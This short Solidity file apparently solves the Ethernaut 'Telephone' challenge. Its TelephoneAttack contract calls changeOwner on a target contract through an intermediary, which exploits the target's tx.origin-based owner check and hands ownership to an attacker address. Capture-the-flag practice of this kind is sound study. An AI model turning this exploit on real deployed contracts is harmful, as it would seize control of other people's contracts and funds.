// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    function attack(address _target, address _attacker) external {
        ITelephone(_target).changeOwner(_attacker);
    }
}
